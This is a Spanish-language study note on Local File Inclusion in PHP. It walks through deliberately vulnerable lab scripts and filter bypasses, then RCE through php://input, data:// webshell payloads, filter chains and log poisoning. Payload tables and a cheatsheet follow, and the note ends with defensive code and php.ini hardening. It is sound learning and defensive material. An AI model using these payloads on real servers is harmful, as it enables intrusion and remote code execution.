---
aliases:
  - LFI
  - Local File Inclusion
tags:
  - sec/web
  - sec/web/rce
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Path Traversal]]"
  - "[[Log Poisoning]]"
  - "[[Abuso de Subida de Archivos]]"
  - "[[Remote File Inclusion RFI]]"
  - "[[OS Command Injection]]"
  - "[[XML External Entity Injection]]"
fuente: "https://portswigger.net/web-security/file-inclusion"
---

# Local File Inclusion (LFI)

La vulnerabilidad **Local File Inclusion** (**LFI**) se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario que llegan a una función de **inclusión/carga de archivos** (`include()`/`require()` en PHP, `readfile`, `FileInputStream`, `render(template)` con ruta controlada), permitiendo a un atacante **leer — y en los casos graves, ejecutar — archivos locales** del servidor. Es [[Path Traversal]] aplicado a la inclusión de archivos, y su impacto escala de divulgación de código/credenciales a **RCE** vía cadenas con wrappers o archivos envenenados (ver [[Log Poisoning]]).

> [!info] ¿Qué es LFI y por qué PHP es el epicentro?
> LFI permite a un atacante incluir archivos arbitrarios del sistema de archivos local en la respuesta de una aplicación web. Esto puede llevar a la divulgación de información sensible, ejecución remota de código (RCE) o incluso la toma de control del servidor. En PHP, `include($user)` no "lee" un archivo: **lo interpreta como código PHP** si tiene etiquetas `<?php ... ?>`, y cualquier texto en el log se ejecuta si contiene payload. Esa semántica — *el archivo incluido se ejecuta* — es lo que convierte un LFI de "lectura de ficheros" en "toma de control".

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de **parámetros de entrada** de la aplicación (URL, formularios, cookies). Los atacantes manipulan estos parámetros para incluir rutas de archivo local en la solicitud. Esta técnica se conoce como "**Path Traversal**" (ver [[Path Traversal]] para la mecánica de resolución de rutas, codificaciones y profundidad).

> [!tip] Path Traversal
> El Path Traversal, también conocido como Directory Traversal, es una técnica que permite a un atacante acceder a archivos y directorios almacenados fuera del directorio raíz web. Se logra manipulando rutas de archivo con secuencias como `../` (punto-punto-barra) para navegar por la estructura de directorios del sistema.

Para prevenir los ataques LFI, es importante que los desarrolladores validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Ver la sección **Defensas** al final (con código).

> [!warning] Prevención de LFI (resumen; detalle en Defensas)
> *   **Listas blancas** de nombres de archivo permitidos.
> *   Validar la **ruta resuelta** (`realpath` + prefijo), no filtrar `../` textualmente.
> *   En PHP, `basename()` solo si además se usa un mapa/allowlist; `open_basedir`; `allow_url_include=Off`.
> *   Permisos mínimos del usuario del servidor web.

## Notas de la práctica: laboratorio PHP local

En este caso, como prueba de concepto, por ahora vamos a jugar con scripts en PHP para entender la vulnerabilidad. Tendremos que levantar el servicio `apache2` con `sudo service apache2 start` y en la carpeta `/var/www/html` vamos a crear un `index.php`. La primera versión será:

```php
<?php
  $filename = $_GET['filename'];
  include($filename);
?>
```

> [!info] LFI Básico
> Esta es la forma más directa de LFI. La función `include()` de PHP, cuando se le pasa una entrada de usuario no validada, intentará incluir cualquier archivo especificado por el parámetro `filename`. Si el archivo es un script PHP, se ejecutará; si es un archivo de texto, su contenido se mostrará.

En esta web, mediante el parámetro `filename`, podremos cargar archivos, como por ejemplo un `test.txt` que tengo en la misma carpeta:

![[Pasted image 20250825120251.png]]

Ahora, el problema llega cuando, al no contar con una correcta sanitización del código y dejar libre el *output* a los usuarios, ellos podrían listar archivos no solo de la carpeta, sino del sistema también, de la siguiente manera:

![[Pasted image 20250825120409.png]]

Esta es la base de un LFI, el más básico de todos.

Bueno, vamos a ver una segunda versión del `index.php` con una pequeña sanitización:

```php
<?php
  $filename = $_GET['filename'];
  include("/var/www/html/" . $filename);
?>
```

![[Pasted image 20250825120524.png]]

Por concepto, esto sí es vulnerable, ya que nosotros podemos retroceder directorios con `../` muchas veces con el objetivo de llegar a la raíz del sistema y luego cargar los archivos.

> [!tip] Bypass de Ruta Base
> Aunque se concatene una ruta base (`/var/www/html/`), un atacante puede usar secuencias `../` repetidas para "escapar" de ese directorio. Por ejemplo, `filename=../../../../etc/passwd` podría acceder a `/etc/passwd` si hay suficientes `../` para salir de `/var/www/html/`.

Bueno, vamos con una versión 3 del `index.php` donde vamos a sanitizar el `../`:

```php
<?php
  $filename = $_GET['filename'];
  $filename = str_replace("../", "", $filename); // remplaza los ../ por nada
  include("/var/www/html/" . $filename);
?>
```

Bueno, si ahora lo intentamos, veremos que no funciona:

![[Pasted image 20250825120934.png]]

Pero algo a considerar es que, por ejemplo, si usan `str_replace()`, esta no es una función recursiva, por lo que solo elimina la primera coincidencia. Por lo tanto, lo podemos burlar con un `....//`:

![[Pasted image 20250825121054.png]]

Como vemos, logramos de nuevo listar y burlar esta pequeña sanitización.

> [!warning] Limitaciones de `str_replace()`
> La función `str_replace()` en PHP no es recursiva por defecto. Si se busca reemplazar `../` por una cadena vacía, y la entrada es `....//`, `str_replace()` solo procesará la primera ocurrencia de `../`, dejando `../` restante. Esto permite el bypass con `....//` (que se convierte en `../` después del primer reemplazo) o `....//....//` y así sucesivamente. **Corrección**: en realidad `str_replace` reemplaza *todas* las ocurrencias no solapadas de una pasada; el bypass `....//` funciona porque `....//` contiene `../` solapado de forma que tras quitar la primera coincidencia sobra `../` — la lección se mantiene: *filtrar strings normalizados contra rutas que se resolverán después es insuficiente*.

En ocasiones, los desarrolladores también van a jugar con expresiones regulares para evitar que se pueda hacer esto, como lo veraremos en esta versión de `index.php`:

```php
<?php
  $filename = $_GET['filename'];
  $filename = str_replace("../", "", $filename); // remplaza los ../ por nada

  if(preg_match("/\/etc\/passwd/", $filename) === 1){
    echo "\n[!] No es posible visualizar el contenido de este archivo\n";
  }else{
    include("/var/www/html/" . $filename);
  }
?>
```

Esto nos da como resultado lo siguiente:

![[Pasted image 20250825121458.png]]

Como podemos observar, no podemos listar por el *match* con `passwd` en este caso; ya no podremos ver el archivo.

Algo que tenemos que tener en cuenta es que el empleo de `preg_match` no es óptimo, ya que por concepto en Linux podemos hacer un `/etc/passwd` y es lo mismo que un `/etc//////passwd` o `/etc/././././passwd` o también con el uso de `?` que sería `/etc/pass?d`, lo que esto, al no tener el *match* completo, lo daría como válido:

![[Pasted image 20250825122136.png]]

> [!tip] Bypass de `preg_match` con rutas flexibles
> Los sistemas operativos Linux son flexibles con las rutas de archivo. Un atacante puede usar:
> *   **Barras múltiples**: `/etc//////passwd` es equivalente a `/etc/passwd`.
> *   **Directorios actuales**: `/etc/././passwd` es equivalente a `/etc/passwd`.
> *   **Wildcards**: `/etc/pass?d` puede coincidir con `/etc/passwd` si la expresión regular no es lo suficientemente estricta.
> Estas técnicas pueden eludir filtros basados en expresiones regulares que buscan cadenas exactas.

Bueno, un desarrollador también puede hacer lo siguiente:

```php
<?php
  $filename = $_GET['filename'];
  $filename = str_replace("../", "", $filename); // remplaza los ../ por nada

  include("/var/www/html" . $filename . ".php"); //fuerza que tenga un .php al final
?>
```

Esto lo que ocasiona es que los archivos que se busquen siempre tengan la extensión `.php` al final, provocando que no encuentre el archivo en el sistema y dé fallo:

![[Pasted image 20250825122426.png]]

En versiones anteriores de PHP, específicamente para versiones inferiores a la 5.3.4, es que nosotros al final de la cadena ingresar un `nullbyte (%00)`, el cual provoca que:

![[Pasted image 20250825123154.png]]

Como vemos, con el `nullbyte` nos permite pasar. El `nullbyte` en el PHP interactivo se lo pone como `\0`, pero es lo mismo.

> [!warning] Null Byte (`%00`) Truncation
> En versiones antiguas de PHP (especialmente < 5.3.4), el carácter *null byte* (`%00` en URL-encoding) podía ser usado para truncar una cadena. Si una aplicación añadía una extensión (`.php`) al final de la entrada del usuario, un atacante podía añadir `%00` después del nombre de archivo deseado (ej. `/etc/passwd%00.php`). El *null byte* haría que la función `include()` o similar ignorara todo lo que venía después, permitiendo la inclusión del archivo sin la extensión forzada.

Ahora, algo que se puede hacer es filtrar por los últimos caracteres para filtrar por los nombres de archivos y bloquearlos de la siguiente manera:

```php
<?php
  $filename = $_GET['filename'];
  $filename = str_replace("../", "", $filename); // remplaza los ../ por nada

  if(substr($filename,-6,6) != "passwd"){
    include($filename);
  }else{
    echo "[!] Archivo no valido";
  }
?>
```

En este caso, ya nos excluye de golpe:

![[Pasted image 20250825123624.png]]

Ahora, en versiones antiguas de PHP, suele funcionar que nosotros, para evitar que se encuentre de forma exitosa el nombre del archivo, podemos agregar `/.` que hace referencia al directorio actual, y esto lograría burlar esa seguridad.

![[Pasted image 20250825123841.png]]

> [!tip] Bypass de `substr()` con `/.`
> Si un filtro utiliza `substr()` para verificar los últimos caracteres de un nombre de archivo (por ejemplo, para bloquear "passwd"), se puede intentar añadir `/.` al final del nombre de archivo. Por ejemplo, `/etc/passwd/.` — en el filesystem POSIX, `passwd/.` resuelve al propio archivo (si es un directorio) o es tolerado por algunas APIs antiguas, alterando la cadena lo suficiente como para eludir la comprobación de `substr()` sin cambiar el archivo al que se apunta.

Otra de las validaciones es que se puede tratar de filtrar por los últimos caracteres buscando que estos sean la extensión de la siguiente manera:

```php
<?php
  $filename = $_GET['filename'];
  $filename = str_replace("../", "", $filename); // remplaza los ../ por nada

  if(substr($filename,-4,4) === ".txt"){
    include($filename);
  }else{
    echo "[!] Archivo no valido";
  }
?>
```

Esto, de igual forma, podemos pasarlo con el `/.` y eso ya permite pasar:

![[Pasted image 20250825124249.png]]

Esto es algo básico de cómo se aplican las diferentes formas de pasar algunas verificaciones.

Estos son los conceptos básicos de un LFI.

## Explotación de LFI con PHP Wrappers

Ahora vamos con algo más práctico, o sea, una máquina vulnerable la cual tiene una web con el siguiente contenido:

![[Pasted image 20250825125719.png]]

Si entramos en las opciones y vemos la URL, nos vamos a dar cuenta de que en ella apunta a la página. Esto quiere decir que de alguna forma está llamando al archivo que contiene esa página:

![[Pasted image 20250825125901.png]]

Podemos intentar los métodos anteriores a ver si alguno nos funciona y logramos ver el contenido de archivos internos en las máquinas:

![[Pasted image 20250825130009.png]]

Vemos que no nos deja, pero algo que podemos intentar es ver si el recurso de `courses.php` existe:

![[Pasted image 20250825130108.png]]

Vemos que sí existe en concepto y lo que puede estar haciendo la web es convertir ese `courses` en un `courses.php`, entonces le concatena a la petición el `.php`.

Ahora, lo que sobreentendemos es que la web está, de cada una de estas páginas, interpretando el código de los archivos `.php`, lo que quiere decir que cualquier código en PHP lo va a interpretar.

Nosotros algo que podemos hacer es usar *wrappers* como el de `php://filter/convert.base64-encode/resource=` y quedaría de la siguiente manera:

![[Pasted image 20250825130937.png]]

Como podemos observar, tenemos un texto en Base64 que es el contenido de `index.php`, por lo que podemos hacer lo inverso y tendríamos el código fuente de la web:

![[Pasted image 20250825131332.png]]

Podemos ver ya el contenido del archivo, donde en realidad hasta podemos ver que de alguna forma incluye otro archivo de conexión que sería `db_connect.php` y está en la ruta de `admin`, por lo que podríamos apuntar al archivo para ver si podemos sacar algo:

![[Pasted image 20250825131606.png]]

Una vez más, tenemos el contenido del archivo y si lo revisamos veremos:

![[Pasted image 20250825131636.png]]

Al parecer, tenemos información privilegiada listando los archivos del proyecto.

> [!info] `php://filter` Wrapper
> El *wrapper* `php://filter` permite aplicar filtros de procesamiento de datos a un flujo antes de que sea leído o escrito. Es extremadamente útil en ataques LFI para:
> *   **Divulgación de código fuente**: `php://filter/convert.base64-encode/resource=archivo.php` codifica el contenido del archivo en Base64, permitiendo al atacante decodificarlo y ver el código fuente, incluso si el servidor lo interpreta como PHP.
> *   **Manipulación de datos**: Otros filtros como `string.rot13` o `convert.iconv.*` pueden ser usados para diferentes propósitos, aunque `base64-encode` es el más común para la divulgación.

En este caso, nos creamos para practicar un Docker nosotros mismos, donde usamos la última versión de Ubuntu y, jugando con *Port Forwarding*, logramos tener una web que nos interpreta el código PHP, por lo que no podemos ver qué es lo que este código contiene:

![[Pasted image 20250825132759.png]]

Lo que intentamos es ver eso y en sí los comentarios y las declaraciones.

![[Pasted image 20250825132829.png]]

Lo que vemos en la web, no aparecen los comentarios ni nada de código en sí porque se está interpretando el código `.php`.

Vamos a usar el *wrapper* que ya conocemos, el de `php://filter/convert.base64-encode/resource=` de la siguiente manera:

![[Pasted image 20250825133032.png]]

Como podemos observar, ya tenemos el código en Base64 y podemos tratar de verlo:

![[Pasted image 20250825133121.png]]

Aparte de este *wrapper*, tenemos muchos más, como son los siguientes:

- `php://filter/read=string.rot13/resource=`
![[Pasted image 20250825133347.png]]
Para que salga en este caso, necesitamos verlo en modo código fuente.
![[Pasted image 20250825133612.png]]

- `php://filter/convert.iconv.utf-8.utf-16/resource=`
![[Pasted image 20250825133903.png]]
De igual forma, lo veremos en modo código fuente.

- `php://input` mediante el método POST podemos ejecutar comandos. En caso de ser GET, tenemos que cambiarlo a POST y listo:
![[Pasted image 20250825134640.png]]
Con esto ya podemos entablar una *reverse shell*.

> [!warning] `php://input` Wrapper
> El *wrapper* `php://input` permite leer datos *raw* del cuerpo de la solicitud HTTP. Si una aplicación es vulnerable a LFI y permite la inclusión de `php://input`, un atacante puede enviar código PHP malicioso en el cuerpo de una solicitud POST. Cuando el servidor incluye `php://input`, el código PHP enviado en el cuerpo de la solicitud se ejecutará, lo que puede llevar a la ejecución remota de comandos (RCE). Mitigación: `allow_url_include = Off` (aunque `php://input` a veces sigue funcionando en `include`; mejor `open_basedir` + deshabilitar wrappers peligrosos).

- `data://text/plain,base64,<cadena en base64>`
![[Pasted image 20250825134943.png]]
También estamos ejecutando comandos y para aclarar, la cadena en Base64 es código en PHP que lo puedes convertir como tú quieras:
![[Pasted image 20250825135042.png]]
Podemos programar lo que nosotros queramos. Esto, por ejemplo, para ejecutar comandos a voluntad, quedaría de la siguiente manera:
![[Pasted image 20250825135332.png]]
Con esto ya podemos ejecutar comandos a voluntad. En ocasiones, no funciona cuando tiene símbolos de *URL-encode*, por lo que con `Ctrl+U` en Burp Suite, seleccionando la cadena en Base64, podemos *URL-encode* y ya funcionaría:
![[Pasted image 20250825135448.png]]

> [!info] `data://` Wrapper
> El *wrapper* `data://` permite incrustar pequeños archivos directamente en la URL. En el contexto de LFI, `data://text/plain,base64,<código_base64>` permite inyectar y ejecutar código PHP codificado en Base64 directamente a través de la URL. Esto es útil cuando no se puede escribir en el sistema de archivos o cuando otras técnicas de inyección están bloqueadas. Es crucial *URL-encode* la cadena Base64 para evitar problemas con caracteres especiales en la URL.

### Ejecución Remota de Comandos con PHP Filter Chain Generator

Mediante la siguiente herramienta:
- **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

Lo que esta herramienta nos permite es de alguna forma introducir código PHP en la web y que la web lo interprete, esto con el objetivo de lograr una ejecución de comandos. Entonces, vamos a usar la herramienta.
![[Pasted image 20250825143447.png]]

Esto podemos pasarle a la web a ver qué logramos:

![[Pasted image 20250825143525.png]]
Vemos que logramos ejecutar el comando y vamos a mejorarlo para que mediante un parámetro lo podamos cambiar:

![[Pasted image 20250825143715.png]]

Y ahora podemos intentar ejecutar los comandos:

![[Pasted image 20250825143815.png]]
Esta es toda la cadena y al final le ponemos el `&cmd=id`.

> [!warning] PHP Filter Chains para RCE
> Las *PHP Filter Chains* son una técnica avanzada para lograr la ejecución remota de código (RCE) a través de LFI, incluso cuando los *wrappers* directos como `php://input` o `data://` están bloqueados. Consisten en encadenar múltiples filtros de PHP (`convert.base64-decode`, `string.strip_tags`, `convert.iconv.*`, etc.) de tal manera que, al final de la cadena, se reconstruye y ejecuta código PHP arbitrario. Herramientas como `php_filter_chain_generator` automatizan la creación de estas cadenas complejas, permitiendo a los atacantes inyectar y ejecutar comandos a través de parámetros de URL. **La consecuencia**: si el LFI permite la sintaxis `php://filter/...`, no necesitas leer ningún archivo existente — el payload se genera "de la nada" con las conversiones iconv.

## Catálogo de wrappers y usos ofensivos

| Wrapper | Payload | Utilidad ofensiva |
|---|---|---|
| `php://filter` | `php://filter/convert.base64-encode/resource=index.php` | lectura de código fuente (evita la interpretación) |
| `php://filter` (rot13/iconv) | `php://filter/read=string.rot13/resource=...` | evadir filtros que buscan `<?php` o palabras clave |
| `php://input` | POST body con `<?php system($_GET['c']); ?>` | RCE directa (si `allow_url_include` lo permite) |
| `data://` | `data://text/plain,base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==` | RCE sin archivo en disco (requiere allow_url_include) |
| Filter chains | `php://filter/convert.iconv.../resource=php://temp` | RCE sin leer ningún archivo |
| `phar://` | `phar://uploads/img.jpg/x` | deserialización + inclusion de stub (si hay upload) |
| `zip://` | `zip://uploads/a.zip%23shell.php` | incluir archivo dentro de un zip subido |
| `expect://` | `expect://id` | RCE si la extensión `expect` está cargada |
| `glob://` | `glob:///*` | enumeración de archivos |

## Cadenas LFI→RCE (cuando los wrappers están cerrados)

Si `allow_url_include=Off` y no hay filter chains, la vía es **incluir un archivo existente que contenga payload**:

| Fuente del payload | Ruta típica | Condición |
|---|---|---|
| [[Log Poisoning]] Apache | `/var/log/apache2/access.log` | UA/URL con `<?php ... ?>` + lectura del log |
| Log SSH | `/var/log/auth.log`, `/var/log/secure` | usuario con payload (parcheado en distros modernos) |
| Session files PHP | `/var/lib/php/sessions/sess_<PHPSESSID>` | guardar payload en `$_SESSION` vía app |
| `/proc/self/environ` | con User-Agent payload | contenedores/kernel modernos suelen bloquearlo |
| `/proc/self/fd/N` | fd de una conexión/POST reciente | carrera: enviar POST con payload e incluir el fd |
| Uploads | `/var/www/uploads/shell.jpg` (PHP en EXIF/imagen) | require upload + extensiones permitidas |
| PEAR/pearcmd | `/usr/share/php/pearcmd.php` | argument injection vía query params (contenedores PHP) |
| Correo | `/var/mail/www-data` | si la app envía mail local con input |

## Detección y reconocimiento

- **Sintaxis sospechosa en parámetros**: `?page=`, `?file=`, `?template=`, `?lang=`, `?path=`, `?include=`, `?doc=`, `?p=` + extensiones.
- **Errores**: `failed to open stream`, `include(): Failed opening`, warnings de PHP expuestos → confirman función de inclusión y ruta base.
- **Comportamiento diferencial**: `?page=../../../etc/passwd` devuelve contenido distinto (o 500 por permisos) que `?page=zzz`.
- **`phpinfo()`** deshabilitado/limitado: usarlo vía LFI (una vez log poisoning) para mapear `disable_functions`, `open_basedir`, `allow_url_include`.

## Defensas

**1. Allowlist dura** (la única defensa que no depende de casos edge):

```php
<?php
const ALLOWED = ['home' => 'home.php', 'courses' => 'courses.php'];
$key = $_GET['page'] ?? 'home';
if (!isset(ALLOWED[$key])) { http_response_code(404); exit; }
require __DIR__ . '/' . ALLOWED[$key];   // nunca se concatena input crudo
```

**2. Si debe ser ruta dinámica**, resolver y validar pertenencia:

```php
<?php
function safeInclude(string $base, string $user): void {
    $real = realpath($base . '/' . $user);       // normaliza ../ y symlinks
    if ($real === false || strpos($real, realpath($base) . '/') !== 0) {
        http_response_code(400); exit('Ruta inválida');
    }
    require $real;                                // solo archivos reales dentro de base
}
```

**3. Endurecer PHP** en `php.ini`:

```ini
allow_url_include = Off        ; mata data:// y php://input en include
allow_url_fopen = Off          ; reduce SSRF/lecturas remotas
open_basedir = /var/www/html   ; límite duro del FS accesible
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,eval
```

**4. Defensa en profundidad**: usuario web sin acceso a `/var/log` ni homes; logs fuera del chroot (ver [[Log Poisoning]]); WAF con reglas para `../`, `php://`, `data://`, `phar://`, `%00` (capa, no solución); no reflejar errores de PHP en producción.

## Errores comunes

**Atacante:**
1. Probar solo `../` y no los wrappers (`php://filter` es el primer paso ante cualquier parámetro de archivo en PHP).
2. Incluir `index.php` directamente y ver "página en blanco" → sin `convert.base64-encode` la interpretación consume el código.
3. Usar `data://` sin URL-encoding del Base64 y sin verificar `allow_url_include`.
4. No probar extensiones alternativas cuando hay sufijo forzado (`.../log.jpg`, `.bak`, `.txt`).
5. Olvidar que la inclusión puede ser **relativa**: `filename=../../../../etc/passwd` depende del CWD real del proceso.

**Defensor:**
1. `str_replace("../","")` o regex sin normalizar (bypass: `....//`, `%2e%2e%2f`, absoluto, `..\\`).
2. Concatenar base + input tras un chequeo previo (TOCTOU de string).
3. Dejar `allow_url_include=On` por defecto (es el ON por historial en muchos stacks).
4. Permitir uploads pero no separar su directorio del que sirve includes.
5. Creer que `.php` forzado al final mitiga (wrappers y `php://filter` no terminan en `.php`).

## Cheatsheet

| Objetivo | Payload |
|---|---|
| Confirmar LFI | `../../../etc/passwd` (Linux), `..\..\..\..\Windows\win.ini` |
| Código fuente | `php://filter/convert.base64-encode/resource=PAGE` |
| Evadir keyword filter | `php://filter/read=string.rot13/resource=PAGE` |
| RCE directa | `data://text/plain,base64,<php>` (allow_url_include=On) |
| RCE sin archivo | filter chain (`php_filter_chain_generator`) |
| RCE vía log | envenenar UA → incluir `/var/log/apache2/access.log` |
| RCE vía session | payload en `$_SESSION` → `sess_<id>` |
| Sufijo forzado `.php` | legacy `%00`; moderno: wrappers (no necesitan extensión) |

## Referencias

- PortSwigger Web Security Academy — File path traversal & LFI: https://portswigger.net/web-security/file-inclusion
- HackTricks — LFI / LFI2RCE: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/
- PayloadsAllTheThings — File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- Synacktiv — PHP filter chains generator: https://github.com/synacktiv/php_filter_chain_generator
- PHP Docs — Wrappers: https://www.php.net/manual/en/wrappers.php

## Relacionadas

- [[Path Traversal]] — mecánica de rutas, codificaciones y bypass de filtros aplicada a cualquier lenguaje
- [[Log Poisoning]] — la cadena LFI→RCE por excelencia (logs como archivo "subido")
- [[Abuso de Subida de Archivos]] — web shell directo cuando sí hay upload
- [[Remote File Inclusion RFI]] — el primo remoto (require_url_include / URLs remotas)
- [[OS Command Injection]] — alternativa a LFI cuando el input llega al shell
- [[XML External Entity Injection]] — otra lectura de archivos locales con semántica distinta
